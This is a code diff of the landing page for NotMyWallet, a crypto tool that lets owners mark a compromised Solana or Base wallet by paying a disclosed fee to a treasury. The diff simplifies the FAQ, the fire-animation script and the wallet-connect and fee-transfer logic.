-            <li>The flag is stored in a registry that can be read by explorers, dapps, bots, etc.</li>
-            <li>You pay a small fee so the registry can’t be spammed for free.</li>
+            <li>You connect the compromised address (no custody, no login).</li>
+            <li>You send a small fee from that wallet to the NotMyWallet treasury.</li>
             <li>
-              Once flagged, that address becomes part of the
-              <strong>“do not send funds here”</strong>
-              set forever.
+              That transaction is a <strong>public marker</strong> that the owner considers this
+              wallet compromised.
+            </li>
+            <li>
+              Indexers, bots and explorers can track this pattern and treat the address as
+              <strong>toxic</strong>.
             </li>
           </ul>
         </article>
 
-        <!-- FAQ -->
         <article class="info-card">
-          <div class="info-label"><span></span> FAQ</div>
+          <div class="info-label"><span></span> FAQ & typical flags</div>
+
           <div class="faq-item">
             <div class="faq-q">Does this recover my stolen funds?</div>
             <div class="faq-a">
@@ -581,56 +818,65 @@
               deposits don’t get farmed by the attacker using your old address.
             </div>
           </div>
+
           <div class="faq-item">
-            <div class="faq-q">Why do I have to empty my wallet first?</div>
+            <div class="faq-q">When should I flag a wallet?</div>
             <div class="faq-a">
-              Because once you flag it, you’re declaring this address as
-              <strong>permanently compromised</strong>. It’s meant to be treated as dead – not used
-              again.
+              Typical use cases:
+              <ul>
+                <li>Phishing link / fake airdrop / scam bot drained your wallet.</li>
+                <li>Your address leaked on a CEX / database and started getting targeted.</li>
+                <li>Malware, screen-share, SIM-swap or device compromise.</li>
+                <li>You used the address for shady tools and don’t trust it anymore.</li>
+              </ul>
             </div>
           </div>
+
           <div class="faq-item">
             <div class="faq-q">Can anyone flag someone else’s wallet?</div>
             <div class="faq-a">
-              Only the wallet that actually controls the private key can sign the transaction and
-              pay the fee. If the attacker still has control, they could also flag it – but that
-              still tells the world this address is toxic.
-            </div>
-          </div>
-          <div class="faq-item">
-            <div class="faq-q">Is this financial / legal advice?</div>
-            <div class="faq-a">
-              No. This is a neutral, permissionless tool. You’re responsible for how you use it and
-              for your own operational security.
+              Only the wallet that actually controls the private key can sign and pay the fee.
+              If the attacker still has control, they could also send it – but that still tells the
+              world this address is toxic.
             </div>
           </div>
         </article>
       </div>
 
-      <!-- Disclaimer -->
       <div class="disclaimer">
         <div class="disclaimer-title">
           <span></span> Important disclaimer
         </div>
         <p>
-          NotMyWallet is an experimental, on-chain registry for compromised addresses. It does not
-          block scammers, freeze funds, or guarantee that third-party services will respect the
-          flag. Using this tool does <strong>not</strong> replace proper OPSEC, KYC, legal recourse
-          or professional security audits. Always move your funds to a fresh wallet you control,
-          triple-check addresses, and never share your seed phrase or private keys with anyone.
+          NotMyWallet is an experimental, on-chain registry concept for compromised addresses. It
+          does not block scammers, freeze funds, or guarantee that third-party services will respect
+          the flag. Using this tool does <strong>not</strong> replace proper OPSEC, KYC, legal
+          recourse or professional security audits. Always move your funds to a fresh wallet you
+          control, triple-check addresses, and never share your seed phrase or private keys with
+          anyone.
         </p>
       </div>
 
       <div class="bottom-footer">
-        Built for the people who got rekt and still want to protect the next ones —
-        <a href="https://x.com/notmywallet_io" target="_blank">@notmywallet_io</a>
-        • #NotMyWallet
+        <div class="bottom-footer-main">
+          Built for the people who got rekt and still want to protect the next ones —
+          <a href="https://x.com/notmywallet_io" target="_blank">@notmywallet_io</a>
+          • #NotMyWallet
+        </div>
+        <div class="social-links">
+          <a href="https://x.com/notmywallet_io" target="_blank">
+            <span>𝕏</span> Follow on X
+          </a>
+          <a href="https://github.com/notmywallet" target="_blank">
+            <span>🐙</span> View on GitHub
+          </a>
+        </div>
       </div>
     </section>
   </div>
 
   <script>
-    // ---- FIRE BACKGROUND ----
+    // FIRE BACKGROUND
     const fireCanvas = document.getElementById("fire");
     const fireCtx = fireCanvas.getContext("2d");
     let particles = [];
@@ -644,45 +890,35 @@
     window.addEventListener("resize", resizeCanvas);
 
     class FlameParticle {
-      constructor() {
-        this.reset();
-      }
-      reset() {
+      constructor(){ this.reset(); }
+      reset(){
         this.x = Math.random() * fireCanvas.width;
         this.y = fireCanvas.height + Math.random() * 40;
         this.size = 1 + Math.random() * 3;
         this.vy = -1.5 - Math.random() * 3;
-        this.hue = 20 + Math.random() * 50; // orange → yellow / green
+        this.hue = 20 + Math.random() * 50;
       }
-      update() {
+      update(){
         this.y += this.vy;
         this.x += Math.sin(Date.now() / 800 + this.y / 40) * 0.2;
         if (this.y < -40) this.reset();
       }
-      draw() {
+      draw(){
         fireCtx.globalAlpha = 0.8;
-        fireCtx.fillStyle = `hsl(${this.hue}, 100%, 55%)`;
-        fireCtx.fillRect(this.x, this.y, this.size, this.size * 8);
+        fireCtx.fillStyle = `hsl(${this.hue},100%,55%)`;
+        fireCtx.fillRect(this.x,this.y,this.size,this.size*8);
       }
     }
 
-    for (let i = 0; i < PARTICLE_COUNT; i++) {
-      particles.push(new FlameParticle());
-    }
-
-    function animateFire() {
-      fireCtx.fillStyle = "rgba(2, 6, 23, 0.18)";
-      fireCtx.fillRect(0, 0, fireCanvas.width, fireCanvas.height);
-      particles.forEach((p) => {
-        p.update();
-        p.draw();
-      });
+    for (let i=0;i<PARTICLE_COUNT;i++) particles.push(new FlameParticle());
+    (function animateFire(){
+      fireCtx.fillStyle = "rgba(2,6,23,0.18)";
+      fireCtx.fillRect(0,0,fireCanvas.width,fireCanvas.height);
+      particles.forEach(p=>{ p.update(); p.draw(); });
       requestAnimationFrame(animateFire);
-    }
-    animateFire();
+    })();
 
-    // ---- WALLET LOGIC ----
-    const SOL_PROGRAM = "9xQeWvG816bUx9EPjHmaT23yvVM2ZWbrrpZb9PusVFin";
+    // WALLET LOGIC
     const SOL_TREASURY = "zeEcyxGeM297wVYXKRjkKFdG1K6EAYwn3CjbajEnYGi";
     const BASE_TREASURY = "0xb454640B8AA2a7974586c121c200541118d01982";
 
@@ -695,18 +931,14 @@
     const chainEl = document.getElementById("chain");
     const addrEl = document.getElementById("addr");
 
-    function setStatus(html) {
-      statusEl.innerHTML = html;
-    }
-
-    function enableFlagButton() {
+    function setStatus(html){ statusEl.innerHTML = html; }
+    function enableFlagButton(){
       flagBtn.disabled = false;
       flagBtn.classList.remove("disabled");
     }
 
-    async function connect() {
+    async function connect(){
       try {
-        // Try Phantom
         if (window.solana && window.solana.isPhantom) {
           await window.solana.connect();
           isSolana = true;
@@ -714,28 +946,24 @@
           showConnected("Solana");
           return;
         }
-
-        // Try MetaMask / EVM
         if (window.ethereum) {
           const web3 = new Web3(window.ethereum);
-          await window.ethereum.request({ method: "eth_requestAccounts" });
+          await window.ethereum.request({ method:"eth_requestAccounts" });
           const accounts = await web3.eth.getAccounts();
           account = accounts[0];
           isSolana = false;
           showConnected("Base");
           return;
         }
-
         alert("You need Phantom (Solana) or MetaMask (EVM) to use NotMyWallet.");
-      } catch (err) {
-        console.error(err);
+      } catch(e){
+        console.error(e);
         setStatus("&gt; Connection cancelled or failed.");
       }
     }
 
-    function showConnected(chainLabel) {
-      const short =
-        account.slice(0, 8) + "…" + account.slice(account.length - 4, account.length);
+    function showConnected(chainLabel){
+      const short = account.slice(0,8) + "…" + account.slice(-4);
       chainEl.textContent = chainLabel;
       addrEl.textContent = short;
       formEl.style.display = "flex";
@@ -743,102 +971,65 @@
       setStatus(`&gt; Connected with <span>${chainLabel}</span> — address ${short}`);
     }
 
-    async function flagCompromised() {
+    async function flagCompromised(){
       if (!account) return;
-
-      const reasonInput = document.getElementById("reason");
-      const reason = reasonInput.value || "hacked";
-
-      setStatus("&gt; Sending flag transaction…");
-
-      if (isSolana) {
-        await flagSolana(reason);
-      } else {
-        await flagBase(reason);
-      }
+      setStatus("&gt; Sending burn-fee transaction...");
+      if (isSolana) await flagSolana(); else await flagBase();
     }
 
-    async function flagSolana(reason) {
-      try {
-        const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-        const provider = new anchor.AnchorProvider(conn, window.solana, {});
-        const idl = await anchor.Program.fetchIdl(SOL_PROGRAM, provider);
-        const program = new anchor.Program(idl, SOL_PROGRAM, provider);
+    async function flagSolana(){
+      try{
+        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+        const fromPubkey = window.solana.publicKey;
+        const toPubkey = new solanaWeb3.PublicKey(SOL_TREASURY);
 
-        const [pda] = anchor.web3.PublicKey.findProgramAddressSync(
-          [Buffer.from("compromised"), window.solana.publicKey.toBuffer()],
-          program.programId
-        );
-
-        const sig = await program.methods
-          .flag(reason)
-          .accounts({
-            user: window.solana.publicKey,
-            compromised: pda,
-            systemProgram: anchor.web3.SystemProgram.programId,
-          })
-          .rpc();
-
-        // Fee transfer
         const tx = new solanaWeb3.Transaction().add(
           solanaWeb3.SystemProgram.transfer({
-            fromPubkey: window.solana.publicKey,
-            toPubkey: new solanaWeb3.PublicKey(SOL_TREASURY),
-            lamports: 10_000_000, // 0.01 SOL
+            fromPubkey,
+            toPubkey,
+            lamports: 10_000_000 // 0.01 SOL
           })
         );
-        const feeSig = await window.solana.signAndSendTransaction(tx);
+
+        const { signature } = await window.solana.signAndSendTransaction(tx);
+        await connection.confirmTransaction(signature, "confirmed");
 
         setStatus(
-          `&gt; BURNED on Solana 🔥<br/>` +
-            `<a href="https://solscan.io/tx/${sig}" target="_blank">View flag tx</a><br/>` +
-            `<a href="https://solscan.io/tx/${feeSig.signature}" target="_blank">View fee tx</a>`
+          `&gt; BURNED on Solana 🔥<br>` +
+          `<a href="https://solscan.io/tx/${signature}" target="_blank">View on Solscan</a>`
         );
-      } catch (err) {
-        console.error(err);
+      } catch(e){
+        console.error(e);
         setStatus("&gt; Failed on Solana – check balance and try again.");
       }
     }
 
-    async function flagBase(reason) {
-      try {
+    async function flagBase(){
+      try{
         const web3 = new Web3(window.ethereum);
-        const abi = [
-          {
-            inputs: [{ internalType: "string", name: "_reason", type: "string" }],
-            name: "flag",
-            outputs: [],
-            stateMutability: "payable",
-            type: "function",
-          },
-        ];
-
-        // NOTE: BASE_TREASURY must be the contract implementing `flag`
-        const contract = new web3.eth.Contract(abi, BASE_TREASURY);
-
-        const tx = await contract.methods.flag(reason).send({
+        const value = web3.utils.toWei("0.001","ether");
+        const txHash = await web3.eth.sendTransaction({
           from: account,
-          value: web3.utils.toWei("0.001", "ether"),
+          to: BASE_TREASURY,
+          value
         });
 
+        const hash = txHash.transactionHash || txHash; // selon le provider
         setStatus(
-          `&gt; BURNED on Base 🔥<br/>` +
-            `<a href="https://basescan.org/tx/${tx.transactionHash}" target="_blank">View on Basescan</a>`
+          `&gt; BURNED on Base 🔥<br>` +
+          `<a href="https://basescan.org/tx/${hash}" target="_blank">View on Basescan</a>`
         );
-      } catch (err) {
-        console.error(err);
-        setStatus("&gt; Failed on Base – check balance, network and contract address.");
+      } catch(e){
+        console.error(e);
+        setStatus("&gt; Failed on Base – check balance, gas and network.");
       }
     }
 
-    function share() {
-      const text =
-        "Just flagged my hacked wallet as dead with @notmywallet_io – on-chain degen privacy. #NotMyWallet";
+    function share(){
+      const text = "Just flagged my hacked wallet as dead with @notmywallet_io – on-chain degen privacy. #NotMyWallet";
       const url = "https://notmywallet.xyz";
-      const xUrl =
-        "https://x.com/intent/tweet?text=" +
-        encodeURIComponent(text + " " + url);
-      window.open(xUrl, "_blank");
+      const xUrl = "https://x.com/intent/tweet?text=" + encodeURIComponent(text + " " + url);
+      window.open(xUrl,"_blank");
     }
   </script>
 </body>
